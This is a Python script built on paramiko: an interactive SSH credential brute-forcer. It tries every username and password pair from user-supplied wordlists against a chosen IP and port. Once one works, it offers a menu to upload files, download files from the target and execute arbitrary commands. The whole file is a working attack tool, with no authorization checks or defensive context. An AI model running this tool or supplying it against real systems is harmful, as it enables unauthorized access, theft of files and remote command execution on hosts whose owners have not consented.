import paramiko
import time

# Define a function to connect to a remote host.
def ssh(hostname, port):
    print("\nTarget's Data:\n")
    # Display the arguments.
    print(f"IP Address: {hostname}\n"
        f"Port: {port}\n")

    ssh.paramiko_client = paramiko.SSHClient()
    ssh.paramiko_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    while True:
        # Main loop. Main Menu.
        choice = input("Main Menu:\n"
                    f"[1] Brute Force Credentials.\n"
                    f"[2] Quit.\n"
                    f"Enter Choice: ")

        if choice == "1":
            name_file_usernames = input("Enter path to file with usernames: ")
            name_file_passwords = input("Enter path to file with passwords: ")
            # Connect to the server.
            print("\n[+] Please be patient! Connecting...")

            file_usernames = open(name_file_usernames, "r+")
            file_passwords = open(name_file_passwords, "r+")

            usernames = file_usernames.read().split("\n")
            passwords = file_passwords.read().split("\n")
            # Username loop.
            for username in usernames:
                # Password loop.
                for password in passwords:
                    time.sleep(0.2)

                    try:
                        # Connecting to server.
                        print("\n[+] Executing one of the combinations...\n")
                        ssh.paramiko_client.connect(hostname=hostname, port=port,
                                                    username=username, password=password,
                                                    timeout=4)

                        print("\n[+] Success! Connected as:\n"
                            f"Username: {username}\n"
                            f"Password: {password}")

                        while True:
                            # Choosing an action.
                            choice = input("\nWhat do you want to do next?:\n"
                                        f"[1] Upload File.\n"
                                        f"[2] Download File.\n"
                                        f"[3] Execute Command.\n"
                                        f"[4] Quit.\n"
                                        f"Enter Choice: ")

                            if choice == "1":
                                # Uploading a file.
                                try:
                                    host_name_upload_file = input("Host's path to upload file: ")
                                    target_upload_file_path = input("Target's path to upload file: ")

                                    print("\n[+] Please be patient! Uploading...\n")

                                    host_upload_file = open(host_name_upload_file, "rb")

                                    sftp = ssh.paramiko_client.open_sftp()
                                    sftp.putfo(host_upload_file, target_upload_file_path)

                                    print("[+] Succesfully uploaded!\n")

                                    host_upload_file.close()
                                    sftp.close()

                                    print("\n[+] Returning to main menu...\n")
                                    continue
                                # Error handling.
                                except Exception as error:
                                    print(f"[-] Error: {error}\n")
                                    continue

                            elif choice == "2":
                                # Downloading a file.
                                try:
                                    host_name_download_file = input("Host's path to download file: ")
                                    target_download_file_path = input("Target's path to download file: ")

                                    print("\n[+] Please be patient! Downloading...\n")

                                    host_download_file = open(host_name_download_file, "wb")

                                    sftp = ssh.paramiko_client.open_sftp()
                                    sftp.getfo(target_download_file_path, host_download_file)

                                    print("[+] Succesfully downloaded!\n")

                                    host_download_file.close()
                                    sftp.close()

                                    print("\n[+] Returning to main menu...\n")
                                    continue
                                # Error handling.
                                except Exception as error:
                                    print(f"[-] Error: {error}\n")
                                    continue

                            elif choice == "3":
                                # Executing a command.
                                command = input("Enter Command: ")

                                print("\nExecuting command...\n")
                                stdin, stdout, stderr = ssh.paramiko_client.exec_command(command)

                                print("[+] Command:\n"
                                    f"{stdout.read().decode('utf-8')}\n")

                                print("\n[+] Returning to main menu...\n")
                                continue

                            elif choice == "4":
                                # Closing connection.
                                ssh.paramiko_client.close()
                                file_usernames.close()
                                file_passwords.close()

                                print("\n[+] Closing connection...\n")
                                break

                            else:
                                # Invalid choice.
                                print("[-] Invalid Choice! Try again.\n")
                                continue

                    # Error handling.
                    except paramiko.AuthenticationException as error:
                        print("[-] Authentication Error!\n"
                            f"{error}")
                    # Error handling.
                    except paramiko.ssh_exception.SSHException as error:
                        print("[-] SSH Error!\n"
                            f"{error}")

                    # Error handling.
                    except Exception as error:
                        print("[-] Unknown Error:\n"
                            f"{error}")

                else:
                    continue
                
            # Closing connection.
            file_usernames.close()
            file_passwords.close()

        elif choice == "2":
            # Closing connection.
            print("Closing connection...\n")
            ssh.paramiko_client.close()
            break

        else:
            print("[-] Invalid Choice! Try again.\n")
            continue


if __name__ == "__main__":
    # You have to enter the input arguments first before running this script.
    print("\nWelcome to SSH!\n")

    hostname = input("Enter IP Address: ")
    port = int(input("Enter Port: "))
    # Main function.
    ssh(hostname, port)
